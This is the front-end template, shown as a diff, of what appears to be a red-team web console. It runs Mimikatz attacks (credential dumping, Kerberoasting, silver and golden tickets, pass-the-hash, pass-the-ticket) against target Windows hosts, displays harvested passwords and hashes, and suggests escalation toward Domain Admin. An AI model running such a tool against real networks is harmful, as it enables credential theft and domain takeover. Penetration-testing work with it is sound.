@@ -1,0 +1,2147 @@
+{% extends 'base/authenticated_base.html' %}
+<!-- start of left column -->
+{% block main %}
+<!-- start of "Choose Parameter" -->
+<h4 class="pb-2 my-4 text-danger border-bottom border-danger"><b>Selector</b></h4>
+
+<div class="progress mb-2" role="progressbar">
+  <div id="executorProgressBar" class="progress-bar progress-bar-striped bg-success" style="width: 0%"></div>
+</div>
+
+<div class="accordion" id="stepAccordion">
+  <!-- start of step 1 -->
+  <div class="accordion-item">
+    <h2 class="accordion-header">
+      <button class="accordion-button collapsed bg-danger text-light font-weight-bold fs-5" type="button" data-bs-toggle="collapse" data-bs-target="#stepOneCollapse" id="stepOneButton">
+        Step 1 &mdash; Select Attack Function
+      </button>
+    </h2>
+    <div id="stepOneCollapse" class="accordion-collapse collapse" data-bs-parent="#stepAccordion" name="stepCollapse">
+      <div class="accordion-body">
+        <p>There are 3 types of attack functions you can select: "Credential Dumping", "Lateral Movement & Domain Privilege Escalation", and "Persistence".</p>
+        <ol class="list-group list-group-numbered">
+          <li class="list-group-item d-flex justify-content-between align-items-start list-group-item-info">
+            <div class="ms-2 me-auto">
+              <div class="fw-bold">Credential Dumping</div>
+              This type of attack function collects the password hashes and cleartext passwords of the selected target's Windows machine, if possible.
+            </div>
+          </li>
+          <li class="list-group-item d-flex justify-content-between align-items-start list-group-item-info">
+            <div class="ms-2 me-auto">
+              <div class="fw-bold">Lateral Movement & Domain Privilege Escalation</div>
+              This type of attack function escalates your privileges to Domain Admins (DA) and allows lateral movement within the target's Active Directory environment.
+            </div>
+          </li>
+          <li class="list-group-item d-flex justify-content-between align-items-start list-group-item-info">
+            <div class="ms-2 me-auto">
+              <div class="fw-bold">Persistence</div>
+              This type of attack function maintains your current privilege and access on the target machine.
+            </div>
+          </li>
+        </ol>
+        <p class="mb-0 mt-2">Upon selection, a brief description of your selected attack function will appear.</p>
+
+        <!-- start of no SeDebugPrivilege warning -->
+        {% set noDebugPrivilegeTargetIpAddresses = [] %}
+        {% for targetIpAddress, value in currentAppConfig['settings']['generalSettings']|dictsort %}
+          {% set hasDebugPrivilege = currentAppConfig['settings']['targetComputer'][targetIpAddress]['hasDebugPrivilege'] %}
+          {% if not hasDebugPrivilege %}
+            {% set _ = noDebugPrivilegeTargetIpAddresses.append(targetIpAddress) %}
+          {% endif %}
+        {% endfor %}
+
+        {% if noDebugPrivilegeTargetIpAddresses %}
+          <div class="mt-4 mb-0 alert alert-warning pt-2 align-self-center text-danger" role="alert">
+            <div class="text-center">
+              <i class="bi bi-exclamation-circle"></i>
+              <span class="alert-heading">Warning!</span>
+            </div>
+            <div class="border border-danger border-1 my-2"></div>
+            <p class="mb-0">The target(s) <code>{{ noDebugPrivilegeTargetIpAddresses|join(', ') }}</code> session does not have the <code>SeDebugPrivilege</code> user privilege. Therefore, that/those target(s) cannot execute the "Dump Recently Logged on Accounts' Password (Mimikatz sekurlsa::logonpasswords)" attack function.</p>
+          </div>
+        {% endif %}
+        <!-- end of no SeDebugPrivilege warning -->
+
+        <!-- start of not domain user warning -->
+        {% set notDomainUserTargetIpAddresses = [] %}
+        {% for targetIpAddress, value in currentAppConfig['settings']['generalSettings']|dictsort %}
+          {% set hasDebugPrivilege = currentAppConfig['settings']['targetComputer'][targetIpAddress]['hasDebugPrivilege'] %}
+          {% if not hasDebugPrivilege %}
+            {% set _ = notDomainUserTargetIpAddresses.append(targetIpAddress) %}
+          {% endif %}
+        {% endfor %}
+
+        {% if notDomainUserTargetIpAddresses %}
+          <div class="mt-4 mb-0 alert alert-warning pt-2 align-self-center text-danger" role="alert">
+            <div class="text-center">
+              <i class="bi bi-exclamation-circle"></i>
+              <span class="alert-heading">Warning!</span>
+            </div>
+            <div class="border border-danger border-1 my-2"></div>
+            <p class="mb-0">The target(s) <code>{{ notDomainUserTargetIpAddresses|join(', ') }}</code> session is not a domain user. Therefore, that/those target(s) can ONLY execute the "Dump Recently Logged on Accounts' Password (Mimikatz sekurlsa::logonpasswords)" attack function.</p>
+          </div>
+        {% endif %}
+        <!-- end of not domain user warning -->
+
+        <p class="card-title">Select Attack Function:</p>
+        <select class="form-select" id="attackPathSelect" onchange="selectFunction(this.value)">
+          <option value="none" selected disabled hidden>Select an Attack Function</option>
+          <optgroup label="Credential Dumping">
+            <option value="credentialDumping">Dump Recently Logged on Accounts' Password (Mimikatz sekurlsa::logonpasswords)</option>
+            <option value="kerberoasting">Extract & Crack Service Accounts' Password (Kerberoasting)</option>
+          </optgroup>
+          <optgroup label="Lateral Movement & Domain Privilege Escalation">
+            <option value="silverTicketAttack">Impersonate Service Accounts (Silver Ticket Attack)</option>
+            <option value="passTheHash">Password Hash Authentication (Pass-the-Hash)</option>
+            <option value="passTheTicket">Kerberos Ticket Authentication (Pass-the-Ticket)</option>
+          </optgroup>
+          <optgroup label="Persistence">
+            <option value="goldenTicketAttack">Domain Admins Persistence (Golden Ticket Attack)</option>
+          </optgroup>
+        </select>
+
+        <div id="functionDescription" style="display: none">
+          <div class="border border-danger border-1 my-3"></div>
+          <ul class="list-group mb-3">
+            <li class="list-group-item d-flex justify-content-between align-items-start list-group-item-info">
+              <div class="ms-2 me-auto">
+                <div class="fw-bold">Attack Function Description:</div>
+                <div id="functionDescriptionText"></div>
+              </div>
+            </li>
+          </ul>
+          After selecting an attack function, you can proceed to the next step: "Step 2 &mdash; Choose Parameter(s)".
+        </div>
+
+      </div>
+    </div>
+  </div>
+  <!-- end of step 1 -->
+
+  <!-- start of step 2 -->
+  <div class="accordion-item">
+    <h2 class="accordion-header">
+      <button class="accordion-button collapsed bg-secondary text-light font-weight-bold fs-5" type="button" data-bs-toggle="collapse" data-bs-target="#stepTwoCollapse" id="stepTwoButton" disabled>
+        Step 2 &mdash; Choose Parameter(s)
+      </button>
+    </h2>
+    <div id="stepTwoCollapse" class="accordion-collapse collapse" data-bs-parent="#stepAccordion" name="stepCollapse">
+      <div class="accordion-body">
+        <p>In this step, you may or may not need to choose the required parameter(s) for Mimikatz (varies depending on the attack function). For instance, attack function "Dump Recently Logged on Accounts' Passwords (sekurlsa::logonpasswords)" does not require any Mimikatz parameters.</p>
+        <h6 class="pb-2 mt-4 text-danger border-bottom border-danger"><b id="chooseParameterTitle">Choose Parameter(s) For Attack Function "{ functionName }"</b></h6>
+        <div id="chooseParameterBody"></div>
+      </div>
+    </div>
+  </div>
+  <!-- end of step 2 -->
+
+  <!-- start of step 3 -->
+  <div class="accordion-item">
+    <h2 class="accordion-header">
+      <button class="accordion-button collapsed bg-secondary text-light font-weight-bold fs-5" type="button" data-bs-toggle="collapse" data-bs-target="#stepThreeCollapse" id="stepThreeButton" disabled>
+        Step 3 &mdash; Execute
+      </button>
+    </h2>
+    <div id="stepThreeCollapse" class="accordion-collapse collapse" data-bs-parent="#stepAccordion" name="stepCollapse">
+      <div class="accordion-body">
+        <p class="mb-0">In this step, you can select the target(s) on which you want to execute your selected attack function. Finally, you can execute the attack function by clicking the large red "Execute" button.</p>
+        <div id="stepThreeTargetIpAddressDiv" style="display: '';">
+          <p class="card-title my-0">Execute on Target(s):</p>
+          <p class="mb-0" id="step3TargetIpAddressCheckboxes">
+            {% for targetIpAddress, value in currentAppConfig['settings']['generalSettings']|dictsort %}
+              <span id="executesTargetIpAddresses" onchange="selectTargetIpAddresses()">
+                <input type="checkbox" id="{{ targetIpAddress }}" name="targetIpAddress" value="{{ targetIpAddress }}">
+                <label for="{{ targetIpAddress }}" class="m-2">{{ targetIpAddress }}</label>
+              </span>
+            {% endfor %}
+          </p>
+        </div>
+        <div id="stepThreeAgentDiv" style="display: none;">
+          <p class="card-title my-0">Execute on Agent(s):</p>
+          <select class="form-select" id="stepThreeAgentSelect" multiple onchange="selectAgent()"></select>
+        </div>
+        <p class="card-title mt-0">Edit Mimikatz Command: (Optional)</p>
+        <p>In addition, you can also edit the following Mimikatz command if you think it's incorrect:</p>
+        <div class="form-floating mb-4">
+          <textarea class="form-control" id="editMimikatzCommand" style="height: 100px" oninput="editMimikatzCommand(this.value)"></textarea>
+          <label for="editMimikatzCommand">Mimikatz Command</label>
+        </div>
+        <button type="button" class="btn btn-danger w-100 border-danger fs-4" id="executeButton" onclick="executeCommand()">Execute</button>
+      </div>
+    </div>
+  </div>
+  <!-- end of step 3 -->
+</div>
+<!-- end of "Choose Parameter" -->
+{% endblock %}
+<!-- end of left column -->
+
+<!-- start of right column -->
+{% block rightColumn %}
+<!-- start of "Output" -->
+<div class="col-lg-6">
+  <div class="card h-100">
+    <div class="card-body">
+      <h4 class="pb-2 mt-4 text-danger border-bottom border-danger"><b>Output</b></h4>
+
+      {% if agentsInformation|length >= 1 %}
+        <p class="card-title">Select a Target/Agent:</p>
+      {% else %}
+        <p class="card-title">Select a Target:</p>
+      {% endif %}
+      <select class="form-select" id="outputTargetIpAddress" onchange="displayTargetIpAddressOutput()">
+        <optgroup label="Target(s)">
+          {% set targetIpAddresses = [] %}
+          {% for targetIpAddress, value in currentAppConfig['settings']['generalSettings']|dictsort %}
+            <option value="{{ targetIpAddress }}" name="outputTargetIpAddresses">{{ targetIpAddress }} (Computer Name: {{ currentAppConfig['settings']['targetComputer'][targetIpAddress]['hostname'] }})</option>
+
+            {% set targetIpAddresses = targetIpAddresses.append(targetIpAddress) %}
+          {% endfor %}
+
+          {% for domain, value in currentAppConfig['settings']['targetDomain']|dictsort %}
+            {% for computer, value in currentAppConfig['settings']['targetDomain'][domain]['computers']|dictsort %}
+              {% set computerIpAddress = currentAppConfig['settings']['targetDomain'][domain]['computers'][computer]['ipAddress']%}
+              {% if computerIpAddress not in targetIpAddresses %}
+                <option value="{{ computerIpAddress }}" name="outputTargetIpAddresses">{{ computerIpAddress }} (Computer Name: {{ computer }})</option>
+
+                {% set targetIpAddresses = targetIpAddresses.append(computerIpAddress) %}
+              {% endif %}
+            {% endfor %}
+          {% endfor %}
+        </optgroup>
+
+        {% if agentsInformation %}
+          <optgroup label="Agent(s)">
+            {% for agentId, agentInformation in agentsInformation.items() %}
+              {% set user = agentInformation['user'] %}
+              {% set targetIpAddress = agentInformation['targetIpAddress'] %}
+              {% set isMimikatzSetup = agentInformation['isMimikatzSetup'] %}
+
+              {% if isMimikatzSetup %}
+                <option value="{{ agentId }}" data-user="{{ user }}" data-targetipaddress="{{ targetIpAddress }}" name="outputTargetIpAddresses" style="overflow-x: scroll;">Agent ID: {{ agentId }} (User: {{ user }} | IP Address: {{ targetIpAddress }})</option>
+                {% set targetIpAddresses = targetIpAddresses.append(agentId) %}
+              {% endif %}
+            {% endfor %}
+          </optgroup>
+        {% endif %}
+      </select>
+      <div class="border border-danger border-1 mt-3"></div>
+
+      {% for targetIpAddress in targetIpAddresses %}
+        <div id="outputTargetIpAddress-{{ targetIpAddress }}" name="outputTargetIpAddressDivs" style="display: none;">
+          <!-- success message -->
+          <div id="succeed-{{ targetIpAddress }}" class="mt-4 alert alert-success text-center pt-2 align-self-center" role="alert" style="display: none;">
+            <h4 class="alert-heading" id="succeedAlertHeading-{{ targetIpAddress }}"></h4>
+            <p class="mb-0" id="succeedAlertPTag-{{ targetIpAddress }}"></p>
+          </div>
+          <!-- failed message -->
+          <div id="error-{{ targetIpAddress }}" class="mt-4 alert alert-danger text-center pt-2 align-self-center" role="alert" style="display: none;">
+            <h4 class="alert-heading" id="failedAlertHeading-{{ targetIpAddress }}"></h4>
+            <p class="mb-0" id="failedAlertPTag-{{ targetIpAddress }}"></p>
+          </div>
+          <!-- pending message -->
+          <div id="pending-{{ targetIpAddress }}" class="mt-4 alert alert-info text-center pt-2 align-self-center" role="alert" style="display: none;">
+            <h4 class="alert-heading" id="pendingAlertHeading-{{ targetIpAddress }}"></h4>
+            <p class="mb-0" id="pendingAlertPTag-{{ targetIpAddress }}"></p>
+          </div>
+
+          {% if targetIpAddress in agentsInformation %}
+            <h5 class="pb-2 my-4 text-danger border-bottom border-danger"><b>Agent ID: {{ targetIpAddress }} (User: {{ agentsInformation[targetIpAddress]['user'] }} | IP Address: {{ agentsInformation[targetIpAddress]['targetIpAddress'] }})</b></h5>
+          {% else %}
+            <h5 class="pb-2 my-4 text-danger border-bottom border-danger"><b>Target: {{ targetIpAddress }}</b></h5>
+          {% endif %}
+
+          <h6 class="pb-2 my-4 text-danger border-bottom border-danger"><b>Result</b></h6>
+          <pre id="resultPreElement-{{ targetIpAddress }}" style="display: none;"><code id="response-{{ targetIpAddress }}"></code></pre>
+
+          <!-- show password hashes cracking option for credential dumping -->
+          <div id="passwordCracking-{{ targetIpAddress }}" name="outputResults-{{ targetIpAddress }}" style="display: none;">
+            <p class="mb-0">You can select an account to read its cleartext password and hash below.</p>
+            <p class="card-title my-0">Select an Account:</p>
+            <select class="form-select mb-3" onchange="displayPasswordCrackingAccount(this.value)" id="passwordCrackingDropDown-{{ targetIpAddress }}"></select>
+            <div class="my-4 border border-danger border-1"></div>
+            <div class="table-responsive">
+              <table id="passwordCrackingTable-{{ targetIpAddress }}" class="table table-bordered"></table>
+            </div>
+          </div>
+          <!-- show password hashes cracking option for credential dumping -->
+
+          <!-- start of show the results of kerberoasting -->
+          <div id="kerberoastingResult-{{ targetIpAddress }}" name="outputResults-{{ targetIpAddress }}" style="display: none;">
+            <p class="mb-0">You can select a service account to read its cleartext password below.</p>
+            <p class="card-title my-0">Select a Service Account:</p>
+            <select class="form-select mb-3" onchange="displaykerberoastingResultAccount(this.value)" id="kerberoastingResultDropDown-{{ targetIpAddress }}"></select>
+            <div class="my-4 border border-danger border-1"></div>
+            <div class="table-responsive">
+              <table id="kerberoastingResultTable-{{ targetIpAddress }}" class="table table-bordered"></table>
+            </div>
+          </div>
+          <!-- end of show the results of kerberoasting -->
+
+          <!-- start of show the results of pass the hash -->
+          <div id="passTheHashResult-{{ targetIpAddress }}" name="outputResults-{{ targetIpAddress }}" style="display: none;">
+            <p>After the attack function "Password Hash Authentication (Pass-the-Hash)" is successful, <b>a new agent (interactive shell) session of your selected account should appear</b>.</p>
+            <p>You can <b>go to the "Executor" page to interact with the new agent</b> by clicking the "Go to Executor Page" gray button below:</p>
+            <button type="button" class="btn btn-secondary w-100 border-secondary fs-5" onclick="window.open('/executor');">Go to Executor Page</button>
+          </div>
+          <!-- end of show the results of pass the hash -->
+
+          <!-- start of show the results of silver ticket (Exporting tickets) -->
+          <div id="silverTicketExportTicketResult-{{ targetIpAddress }}" name="outputResults-{{ targetIpAddress }}" style="display: none;">
+            <p class="mb-0">The forged ticket(s) have been stored in the settings. You can select a service account to export those ticket(s) below.</p>
+            <p class="card-title my-0">Select a Service Account:</p>
+            <select class="form-select mb-3" onchange="displaySilverTicketExportTicketResultAccount(this.value)" id="silverTicketExportTicketResultDropDown-{{ targetIpAddress }}"></select>
+            <div class="my-4 border border-danger border-1"></div>
+            <div class="table-responsive">
+              <table id="silverTicketExportTicketResultTable-{{ targetIpAddress }}" class="table table-bordered"></table>
+            </div>
+          </div>
+          <!-- end of show the results of silver ticket (Exporting tickets) -->
+
+          <!-- start of show the results of silver ticket (pass the ticket) -->
+          <div id="silverTicketPttResult-{{ targetIpAddress }}" name="outputResults-{{ targetIpAddress }}" style="display: none;">
+            <p class="mb-0">The ticket(s) have been injected into the selected target's memory. You can select a service account to see more details below.</p>
+            <p class="card-title my-0">Select a Service Account:</p>
+            <select class="form-select mb-3" onchange="displaySilverTicketResultAccount(this.value)" id="silverTicketPttResultDropDown-{{ targetIpAddress }}"></select>
+            <div class="my-4 border border-danger border-1"></div>
+            <div class="table-responsive">
+              <table id="silverTicketPttResultTable-{{ targetIpAddress }}" class="table table-bordered"></table>
+            </div>
+            <p>After the attack function "Impersonate Service Accounts (Silver Ticket Attack)" is successful, <b>a new agent (interactive shell) session of your selected service account should appear</b>.</p>
+            <p>You can <b>go to the "Executor" page to interact with the new agent</b> by clicking the "Go to Executor Page" gray button below:</p>
+            <button type="button" class="btn btn-secondary w-100 border-secondary fs-5" onclick="window.open('/executor');">Go to Executor Page</button>
+          </div>
+          <!-- end of show the results of silver ticket (pass the ticket) -->
+
+          <!-- start of show the results of pass-the-ticket -->
+          <div id="passTheTicketResult-{{ targetIpAddress }}" name="outputResults-{{ targetIpAddress }}" style="display: none;">
+            <p class="mb-0">The ticket(s) have been injected into the selected target's memory. You can select an account to see more details below.</p>
+            <p class="card-title my-0">Select an Account:</p>
+            <select class="form-select mb-3" onchange="displayPassTheTicketResultAccount(this.value)" id="passTheTicketResultDropDown-{{ targetIpAddress }}"></select>
+            <div class="my-4 border border-danger border-1"></div>
+            <div class="table-responsive">
+              <table id="passTheTicketResultTable-{{ targetIpAddress }}" class="table table-bordered"></table>
+            </div>
+            <p>After the attack function "Kerberos Ticket Authentication (Pass-the-Ticket)" is successful, <b>a new agent (interactive shell) session of your selected ticket(s) should appear</b>.</p>
+            <p>You can <b>go to the "Executor" page to interact with the new agent</b> by clicking the "Go to Executor Page" gray button below:</p>
+            <button type="button" class="btn btn-secondary w-100 border-secondary fs-5" onclick="window.open('/executor');">Go to Executor Page</button>
+          </div>
+          <!-- end of show the results of pass-the-ticket -->
+
+          <!-- start of show the results of golden ticket (Exporting tickets) -->
+          <div id="goldenTicketExportTicketResult-{{ targetIpAddress }}" name="outputResults-{{ targetIpAddress }}" style="display: none;">
+            <p class="mb-0">The forged golden ticket has been stored in the settings. You can select the forged account to export the ticket below.</p>
+            <p class="card-title my-0">Select the Forged Golden Ticket Account:</p>
+            <select class="form-select mb-3" onchange="displayGoldenTicketExportTicketResultAccount(this.value)" id="goldenTicketExportTicketResultDropDown-{{ targetIpAddress }}"></select>
+            <div class="my-4 border border-danger border-1"></div>
+            <div class="table-responsive">
+              <table id="goldenTicketExportTicketResultTable-{{ targetIpAddress }}" class="table table-bordered"></table>
+            </div>
+          </div>
+          <!-- end of show the results of golden ticket (Exporting tickets) -->
+
+          <!-- start of show the results of golden ticket (pass the ticket) -->
+          <div id="goldenTicketPttResult-{{ targetIpAddress }}" name="outputResults-{{ targetIpAddress }}" style="display: none;">
+            <p class="mb-0">The golden ticket has been injected into the selected target's memory. You can select the forged account to see more details below.</p>
+            <p class="card-title my-0">Select the Forged Golden Ticket Account:</p>
+            <select class="form-select mb-3" onchange="displayGoldenTicketResultAccount(this.value)" id="goldenTicketPttResultDropDown-{{ targetIpAddress }}"></select>
+            <div class="my-4 border border-danger border-1"></div>
+            <div class="table-responsive">
+              <table id="goldenTicketPttResultTable-{{ targetIpAddress }}" class="table table-bordered"></table>
+            </div>
+            <p>After the attack function "Domain Admins Persistence (Golden Ticket Attack)" is successful, <b>a new agent (interactive shell) session of your selected service account should appear</b>.</p>
+            <p>You can <b>go to the "Executor" page to interact with the new agent</b> by clicking the "Go to Executor Page" gray button below:</p>
+            <button type="button" class="btn btn-secondary w-100 border-secondary fs-5" onclick="window.open('/executor');">Go to Executor Page</button>
+          </div>
+          <!-- end of show the results of golden ticket (pass the ticket) -->
+
+          <h6 class="pb-2 my-4 text-danger border-bottom border-danger"><b>Mimikatz Command</b></h6>
+          <button class="btn btn-info w-100 border-info fs-5" type="button" data-bs-toggle="collapse" data-bs-target="#mimikatzCommandCollapse">Click Me to Show the Full Mimikatz Command</button>
+          <div class="collapse" id="mimikatzCommandCollapse">
+            <pre class="code"><code id="mimikatzCommand-{{ targetIpAddress }}" name="mimikatzCommands" class="powershell"></code></pre>
+          </div>
+        </div>
+      {% endfor %}
+
+    </div>
+  </div>
+</div>
+
+<!-- start of automate executor initial setup modal -->
+<div class="modal fade modal-xl" id="executorInitialSetupModal" tabindex="-1">
+  <div class="modal-dialog" id="executorInitialSetupModalDialog">
+    <div class="modal-content">
+      <div class="modal-header" id="executorInitialSetupModalHeader">
+        <h5 class="card-title" id="executorInitialSetupModalTitle">Automate Executor</h5>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+      <div class="modal-body" id="executorInitialSetupModalBody">
+        <h5 class="pb-2 mb-4 text-danger border-bottom border-danger"><b>Automatically Executed Attack Function(s)</b></h5>
+        <p>
+          To reduce the heavy-lifting jobs of dumping credentials on the target machine(s), the application has already performed the task for you.
+          <br>
+          The following attack function(s) have been executed, and you can view the results below:
+        </p>
+        <ol class="list-group list-group-numbered">
+          <li class="list-group-item bg-success text-white">Dump Recently Logged on Accounts' Password (Mimikatz sekurlsa::logonpasswords)</li>
+          {% for targetIpAddress, value in currentAppConfig['settings']['targetComputer']|dictsort %}
+            {% set isDomainJoinedComputer = currentAppConfig['settings']['targetComputer'][targetIpAddress]['isDomainJoinedComputer'] %}
+            {% if isDomainJoinedComputer %}
+              <li class="list-group-item bg-success text-white">Extract & Crack Service Accounts' Password (Kerberoasting)</li>
+            {% endif %}
+          {% endfor %}
+        </ol>
+        <h5 class="card-title">Select an Account:</h5>
+        <select class="form-select mb-3" onchange="displayExecutorSettings()" id="executorUserAccountDropDown">
+          {% for username, value in currentAppConfig['settings']['executor']|dictsort %}
+            <option value="{{ username }}">Account: {{ username }} (Domain: {{ currentAppConfig['settings']['executor'][username]['domain'] }})</option>
+          {% endfor %}
+        </select>
+        <div class="my-4 border border-danger border-1"></div>
+        <div class="table-responsive">
+          <table class="table table-bordered">
+            <thead class="table-info">
+              <tr>
+                <th scope="col" class="text-center col-4" style="vertical-align: top;">Description</th>
+                <th scope="col" class="text-center col-4" style="vertical-align: top;">Value</th>
+              </tr>
+            </thead>
+            {% for username, value in currentAppConfig['settings']['executor']|dictsort %}
+              <tbody id="executorTableBody" data-username="{{ username }}" style="display: none;">
+                {% if 'clearTextPassword' in currentAppConfig['settings']['executor'][username] %}
+                  <tr>
+                    <th scope="row">Cleartext Password:<br>(Cracked Password Legend: <span class="bg-success text-white px-2">password</span>)</th>
+                    {% if 'isCracked' in currentAppConfig['settings']['executor'][username] %}
+                      {% if currentAppConfig['settings']['executor'][username]['isCracked'] == True %}
+                        <td><input type="text" class="form-control bg-success text-white" name="executor-{{ username }}" value="{{ currentAppConfig['settings']['executor'][username]['clearTextPassword'] }}" disabled></td>
+                      {% else %}
+                        <td><input type="text" class="form-control" name="executor-{{ username }}" value="{{ currentAppConfig['settings']['executor'][username]['clearTextPassword'] }}" disabled></td>
+                      {% endif %}
+                    {% endif %}
+                  </tr>
+                {% endif %}
+                {% if 'ntlm' in currentAppConfig['settings']['executor'][username] %}
+                  <tr>
+                    <th scope="row">NTLM Password Hash:</th>
+                    <td><input type="text" class="form-control" name="executor-{{ username }}" value="{{ currentAppConfig['settings']['executor'][username]['ntlm'] }}" disabled></td>
+                  </tr>
+                {% endif %}
+                {% if 'kerberoasting' in currentAppConfig['settings']['executor'][username] %}
+                  <tr>
+                    <th scope="row">Kerberoasting Cleartext Password:<br>(Cracked Password Legend: <span class="bg-success text-white px-2">password</span>)</th>
+                    {% if currentAppConfig['settings']['executor'][username]['kerberoasting']['status'] == 'Cracked' %}
+                      <td><input type="text" class="form-control bg-success text-white" name="executor-{{ username }}" value="{{ currentAppConfig['settings']['executor'][username]['kerberoasting']['crackedPassword'] }}" disabled></td>
+                    {% else %}
+                      <td><input type="text" class="form-control" name="executor-{{ username }}" value="{{ currentAppConfig['settings']['executor'][username]['kerberoasting']['crackedPassword'] }}" disabled></td>
+                    {% endif %}
+                  </tr>
+                  <tr>
+                    <th scope="row">Export the TGS Ticket:</th>
+                    <td><a href="/api/exportTgsTicket/kerberoasting/{{ username }}" target="_blank"><button type="button" class="btn btn-secondary form-control">Click Me to Export the TGS Ticket</button></a></td>
+                  </tr>
+                {% endif %}
+              </tbody>
+            {% endfor %}
+          </table>
+        </div>
+        {% if currentAppConfig['settings']['targetDomain'] %}
+          <div>
+            <h5 class="pb-2 mb-4 text-danger border-bottom border-danger"><b>Suggested Attack Function(s)</b></h5>
+            <p>Based on the results of the automatically executed attack function(s), the application suggests the following attack function(s) to escalate your privileges and move laterally within the Active Directory domain:</p>
+            {% for username, value in currentAppConfig['settings']['executor']|dictsort %}
+              {% set ntlmHash = currentAppConfig['settings']['executor'][username]['ntlm'] %}
+              {% set isPasswordCracked = currentAppConfig['settings']['executor'][username]['isCracked'] %}
+              {% set userDomain = currentAppConfig['settings']['executor'][username]['domain'] %}
+              
+              {% set kerberoastableServiceAccountUsernames = [] %}
+              {% for domain in currentAppConfig['settings']['targetDomain'] %}
+                {% set kerberoastableServiceAccounts = currentAppConfig['settings']['targetDomain'][domain]['kerberoastableServiceAccounts'] %}
+                {% for serviceAccount in kerberoastableServiceAccounts %}
+                  {% set _ = kerberoastableServiceAccountUsernames.append(serviceAccount) %}
+                {% endfor %}
+              {% endfor %}
+
+              {% set notKerberoastableServiceAccount = True if username not in kerberoastableServiceAccountUsernames else False %}
+              {% if ntlmHash and notKerberoastableServiceAccount %}
+                <ul class="list-group">
+                  <li class="list-group-item d-flex justify-content-between align-items-start list-group-item-info">
+                    <div class="ms-2 me-auto">
+                      <div class="fw-bold">Password Hash Authentication (Pass-the-Hash)</div>
+                      Username: <code>{{ username }}</code>
+                      {% if isPasswordCracked %}
+                        <br>Cleartext password: <code>{{ currentAppConfig['settings']['executor'][username]['clearTextPassword'] }}</code>
+                      {% endif %}
+                      <br>
+                      NTLM hash: <code>{{ ntlmHash }}</code>
+                      <br>
+                      Domain: <code>{{ userDomain }}</code>
+                    </div>
+                  </li>
+                </ul>
+              {% endif %}
+            {% endfor %}
+
+            {% for username, value in currentAppConfig['settings']['executor']|dictsort %}
+              {% set domain = currentAppConfig['settings']['executor'][username]['domain'] %}
+              {% if domain in currentAppConfig['settings']['targetDomain'] %}
+                {% if username in currentAppConfig['settings']['targetDomain'][domain]['users'] %}
+                  {% set kerberoastableServiceAccounts = currentAppConfig['settings']['targetDomain'][domain]['kerberoastableServiceAccounts'] %}
+
+                  {% if kerberoastableServiceAccounts %}
+                    {% for serviceAccountUsername in kerberoastableServiceAccounts %}
+                      {% if 'kerberoasting' not in currentAppConfig['settings']['executor'][serviceAccountUsername] %}
+                        <ul class="list-group">
+                          <li class="list-group-item d-flex justify-content-between align-items-start list-group-item-info">
+                            <div class="ms-2 me-auto">
+                              <div class="fw-bold">Extract & Crack Service Accounts' Password (Kerberoasting)</div>
+                              Service account username: <code>{{ serviceAccountUsername }}</code>
+                              <br>
+                              Service Principal Names (SPNs): <code>{{ currentAppConfig['settings']['targetDomain'][domain]['kerberoastableServiceAccounts'][serviceAccountUsername]['servicePrincipalNames']|join(', ') }}</code>
+                            </div>
+                          </li>
+                        </ul>
+                      {% endif %}
+                    {% endfor %}
+                  {% endif %}
+
+                  {% if kerberoastableServiceAccounts %}
+                    {% if 'kerberoasting' in currentAppConfig['settings']['executor'][username] %}
+                      {% if currentAppConfig['settings']['executor'][username]['kerberoasting']['status'] == 'Cracked' %}
+                        <ul class="list-group">
+                          <li class="list-group-item d-flex justify-content-between align-items-start list-group-item-info">
+                            <div class="ms-2 me-auto">
+                              <div class="fw-bold">Impersonate Service Accounts (Silver Ticket Attack)</div>
+                              Service account username: <code>{{ username }}</code>
+                              <br>
+                              Cleartext password: <code>{{ currentAppConfig['settings']['executor'][username]['kerberoasting']['crackedPassword'] }}</code>
+                              <br>
+                              Service Principal Names (SPNs): <code>{{ currentAppConfig['settings']['targetDomain'][domain]['kerberoastableServiceAccounts'][username]['servicePrincipalNames']|join(', ') }}</code>
+                            </div>
+                          </li>
+                        </ul>
+                      {% endif %}
+                    {% endif %}
+                  {% endif %}
+
+                {% endif %}
+              {% endif %}
+            {% endfor %}
+          </div>
+        {% endif %}
+      <div class="modal-footer">
+        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+      </div>
+    </div>
+  </div>
+</div>
+<!-- end of executor initial setup modal -->
+
+<script type="text/javascript">
+const executorProgressBar = document.getElementById("executorProgressBar");
+var executorProgress = 0;
+
+const attackPathSelectValue = document.getElementById("attackPathSelect").value;
+const functionDescriptionDiv = document.getElementById("functionDescription");
+const functionDescriptionTextDiv = document.getElementById("functionDescriptionText");
+const mimikatzCommandCodeBlocks = document.querySelectorAll("code[name=mimikatzCommands]");
+
+var editMimikatzCommandTextarea = document.getElementById("editMimikatzCommand");
+
+var isAttackPathFunctionSelected = false;
+var isStepOneCompleted = false;
+var isStepTwoCompleted = false;
+var isStepThreeCompleted = false;
+
+var chooseParameterTitle = document.getElementById("chooseParameterTitle");
+var chooseParameterBodyDiv = document.getElementById("chooseParameterBody");
+
+var attackPathName = "";
+var functionName = "";
+
+var stepThreeButtonElement = document.getElementById("stepThreeButton");
+var stepThreeTargetIpAddressDiv = document.getElementById("stepThreeTargetIpAddressDiv");
+var stepThreeAgentDiv = document.getElementById("stepThreeAgentDiv");
+var stepThreeAgentSelect = document.getElementById("stepThreeAgentSelect");
+
+var stepCollapseElementList, stepCollapseList;
+
+window.addEventListener('DOMContentLoaded', async function() {
+  stepCollapseElementList = document.querySelectorAll('div[name=stepCollapse');
+  stepCollapseList = [...stepCollapseElementList].map(collapseEl => new bootstrap.Collapse(collapseEl));
+  // race condition problem
+  await sleep(500);
+  stepCollapseList[1].hide();
+  stepCollapseList[2].hide();
+
+  displayTargetIpAddressOutput();
+
+  selectFunction(attackPathSelectValue);
+
+  selectTargetIpAddresses();
+  // same race condition problem in function `initializeChooseParameters()`
+  await sleep(500);
+  if (isStepOneCompleted && isStepTwoCompleted && isStepThreeCompleted) {
+    stepCollapseList[2].show();
+    stepThreeButtonElement.setAttribute("class", "accordion-button bg-success collapsed text-light font-weight-bold fs-5");
+  } else if (isStepOneCompleted && isStepTwoCompleted) {
+    stepCollapseList[2].show();
+    stepThreeButtonElement.setAttribute("class", "accordion-button bg-danger collapsed text-light font-weight-bold fs-5");
+  } else {
+    stepThreeButtonElement.setAttribute("class", "accordion-button bg-secondary collapsed text-light font-weight-bold fs-5");
+  }
+
+  // show automatically executed functions right after initial setup
